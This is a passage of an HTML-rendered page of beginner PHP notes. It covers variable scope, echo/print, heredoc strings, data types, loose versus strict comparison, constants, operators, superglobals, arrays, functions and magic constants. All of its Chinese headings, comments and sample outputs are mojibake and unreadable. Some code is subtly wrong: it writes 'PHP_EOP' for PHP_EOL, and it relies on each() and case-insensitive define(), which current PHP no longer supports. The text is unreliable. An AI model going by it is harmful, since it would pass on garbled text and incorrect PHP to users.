keyword">echo</span> <span class="token string double-quoted-string">"å˜é‡ y ä¸º: <span class="token interpolation"><span class="token variable">$y</span></span>"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>    /*æµ‹è¯•å‡½æ•°å†…å˜é‡:å˜é‡ x ä¸º:å˜é‡ y ä¸º: 101æµ‹è¯•å‡½æ•°å¤–å˜é‡:å˜é‡ x ä¸º: 5å˜é‡ y ä¸º: 10æµ‹è¯•å‡½æ•°å¤–å˜é‡:å˜é‡ x ä¸º: 5å˜é‡ y ä¸º: 15*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="echo-print"><a href="#echo-print" class="headerlink" title="echo/print"></a>echo/print</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token operator">-</span> å¯ä»¥è¾“å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²<span class="token keyword">print</span> <span class="token operator">-</span> åªå…è®¸è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›å€¼æ€»ä¸º <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="PHP-EOF"><a href="#PHP-EOF" class="headerlink" title="PHP_EOF"></a>PHP_EOF</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string single-quoted-string">'1'</span><span class="token operator">.</span><span class="token constant">PHP_EOP</span><span class="token operator">.</span><span class="token string double-quoted-string">"3"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string heredoc-string"><span class="token delimiter symbol"><span class="token punctuation">&lt;&lt;&lt;</span>EOF</span>        &lt;h1&gt;æˆ‘çš„ç¬¬ä¸€ä¸ªæ ‡é¢˜&lt;/h1&gt;        &lt;p&gt;æˆ‘çš„ç¬¬ä¸€ä¸ªæ®µè½ã€‚&lt;/p&gt;<span class="token delimiter symbol">EOF<span class="token punctuation">;</span></span></span><span class="token comment">// ç»“æŸéœ€è¦ç‹¬ç«‹ä¸€è¡Œä¸”å‰åä¸èƒ½ç©ºæ ¼</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token string double-quoted-string">"hello world"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token string single-quoted-string">'djh $x'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$z</span><span class="token operator">=</span><span class="token string double-quoted-string">"djh <span class="token interpolation"><span class="token variable">$x</span></span>"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$z</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"aaa"</span><span class="token operator">.</span><span class="token string double-quoted-string">"bbbb"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'aa'</span><span class="token operator">.</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token string single-quoted-string">'s'</span><span class="token operator">.</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'djh'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0x8C</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token number">0x8C</span><span class="token punctuation">;</span><span class="token comment">//16è¿›åˆ¶</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">047</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//8è¿›åˆ¶</span><span class="token variable">$e</span><span class="token operator">=</span><span class="token number">2.4e3</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$g</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">==</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Car</span><span class="token punctuation">{</span>  <span class="token keyword">var</span> <span class="token variable">$color</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$color</span><span class="token operator">=</span><span class="token string double-quoted-string">"green"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">color</span> <span class="token operator">=</span> <span class="token variable">$color</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function-definition function">what_color</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">color</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">print_vars</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$prop</span> <span class="token operator">=&gt;</span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\t<span class="token interpolation"><span class="token variable">$prop</span></span> = <span class="token interpolation"><span class="token variable">$val</span></span>\n"</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// å®ä¾‹ä¸€ä¸ªå¯¹è±¡</span><span class="token variable">$herbie</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"white"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ˜¾ç¤º herbie å±æ€§</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\therbie: Properties\n"</span><span class="token punctuation">;</span><span class="token function">print_vars</span><span class="token punctuation">(</span><span class="token variable">$herbie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*string(11) "hello world" string(6) "djh $x" string(15) "djh hello world" string(7) "aaabbbb" aaa satestdjhint(140) int(140) int(39) float(2400) bool(false) NULL 10 herbie: Properties color = white*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç±»å‹æ¯”è¾ƒ"><a href="#ç±»å‹æ¯”è¾ƒ" class="headerlink" title="ç±»å‹æ¯”è¾ƒ"></a>ç±»å‹æ¯”è¾ƒ</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">//æ¾æ•£æ¯”è¾ƒï¼šä½¿ç”¨ä¸¤ä¸ªç­‰å· == æ¯”è¾ƒï¼Œåªæ¯”è¾ƒå€¼ï¼Œä¸æ¯”è¾ƒç±»å‹ã€‚//ä¸¥æ ¼æ¯”è¾ƒï¼šç”¨ä¸‰ä¸ªç­‰å· === æ¯”è¾ƒï¼Œé™¤äº†æ¯”è¾ƒå€¼ï¼Œä¹Ÿæ¯”è¾ƒç±»å‹ã€‚<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'0 == false: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'0 === false: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'0 == null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'0 === null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'false == null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'false === null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"0" == false: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"0" === false: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"0" == null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"0" === null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"" == false: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"" === false: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"" == null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"" === null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*//æ¾æ•£æ¯”è¾ƒï¼šä½¿ç”¨ä¸¤ä¸ªç­‰å· == æ¯”è¾ƒï¼Œåªæ¯”è¾ƒå€¼ï¼Œä¸æ¯”è¾ƒç±»å‹ã€‚ //ä¸¥æ ¼æ¯”è¾ƒï¼šç”¨ä¸‰ä¸ªç­‰å· === æ¯”è¾ƒï¼Œé™¤äº†æ¯”è¾ƒå€¼ï¼Œä¹Ÿæ¯”è¾ƒç±»å‹ã€‚ 0 == false: bool(true) 0 === false: bool(false) 0 == null: bool(true) 0 === null: bool(false) false == null: bool(true) false === null: bool(false) "0" == false: bool(true) "0" === false: bool(false) "0" == null: bool(false) "0" === null: bool(false) "" == false: bool(true) "" === false: bool(false) "" == null: bool(true) "" === null: bool(false)*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å¸¸é‡"><a href="#å¸¸é‡" class="headerlink" title="å¸¸é‡"></a>å¸¸é‡</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// ä¸åŒºåˆ†å¤§å°å†™çš„å¸¸é‡å</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GREETING"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"æ¬¢è¿è®¿é—® Runoob.com"</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> greeting<span class="token punctuation">;</span>  <span class="token comment">// è¾“å‡º "æ¬¢è¿è®¿é—® Runoob.com"</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" world!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment">// è¾“å‡ºHello world! </span> <span class="token variable">$x</span><span class="token operator">=</span><span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">" world!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token punctuation">;</span> <span class="token comment">// è¾“å‡ºHello world! </span><span class="token delimiter important">?&gt;</span></span>    //Hello world!Hello world!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$txt1</span><span class="token operator">=</span><span class="token string double-quoted-string">"Hello world!"</span><span class="token punctuation">;</span><span class="token variable">$txt2</span><span class="token operator">=</span><span class="token string double-quoted-string">"What a nice day!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$txt1</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$txt2</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¶…çº§å…¨å±€å˜é‡"><a href="#è¶…çº§å…¨å±€å˜é‡" class="headerlink" title="è¶…çº§å…¨å±€å˜é‡"></a>è¶…çº§å…¨å±€å˜é‡</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$GLOBALS</span><span class="token variable">$_SERVER</span><span class="token variable">$_REQUEST</span><span class="token variable">$_POST</span><span class="token variable">$_GET</span><span class="token variable">$_FILES</span><span class="token variable">$_ENV</span><span class="token variable">$_COOKIE</span><span class="token variable">$_SESSION</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ha"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"lo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$age</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Peter"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"35"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Ben"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"37"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Joe"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"43"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ages</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Peter'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"35"</span><span class="token punctuation">;</span><span class="token variable">$ages</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Ben'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"37"</span><span class="token punctuation">;</span><span class="token variable">$ages</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Joe'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"43"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Peter is "</span> <span class="token operator">.</span> <span class="token variable">$age</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Peter'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" years old."</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$age</span> <span class="token keyword">as</span> <span class="token variable">$x</span><span class="token operator">=&gt;</span><span class="token variable">$x_value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Key="</span> <span class="token operator">.</span> <span class="token variable">$x</span> <span class="token operator">.</span> <span class="token string double-quoted-string">", Value="</span> <span class="token operator">.</span> <span class="token variable">$x_value</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">asort</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é”®å€¼å‡åº</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$age</span> <span class="token keyword">as</span> <span class="token variable">$x</span><span class="token operator">=&gt;</span><span class="token variable">$x_value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Key="</span> <span class="token operator">.</span> <span class="token variable">$x</span> <span class="token operator">.</span> <span class="token string double-quoted-string">", Value="</span> <span class="token operator">.</span> <span class="token variable">$x_value</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">arsort</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é”®å€¼é™åº</span><span class="token function">ksort</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é”®åå‡åº</span><span class="token function">krsort</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é”®åé™åº</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">each</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"????"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'fuck'</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string double-quoted-string">"you arb bici"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é­”æœ¯å˜é‡"><a href="#é­”æœ¯å˜é‡" class="headerlink" title="é­”æœ¯å˜é‡"></a>é­”æœ¯å˜é‡</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'è¿™æ˜¯ç¬¬ " '</span>  <span class="token operator">.</span> <span class="token constant">__LINE__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' " è¡Œ'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'è¯¥æ–‡ä»¶ä½äº " '</span>  <span class="token operator">.</span> <span class="token constant">__FILE__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' " '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'è¯¥æ–‡ä»¶ä½äº " '</span>  <span class="token operator">.</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' " '</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span>  <span class="token string single-quoted-string">'å‡½æ•°åä¸ºï¼š'</span> <span class="token operator">.</span> <span class="token constant">__FUNCTION__</span> <span class="token punctuation">;</span>    <span class="token keyword">echo</span>  <span class="token string single-quoted-string">'å‡½æ•°åä¸ºï¼š'</span> <span class="token operator">.</span> <span class="token constant">__METHOD__</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function-definition function">_print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'ç±»åä¸ºï¼š'</span>  <span class="token operator">.</span> <span class="token constant">__CLASS__</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span>  <span class="token string single-quoted-string">'å‡½æ•°åä¸ºï¼š'</span> <span class="token operator">.</span> <span class="token constant">__FUNCTION__</span> <span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$t</span><span class="token operator">-&gt;</span><span class="token function">_print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Base</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span 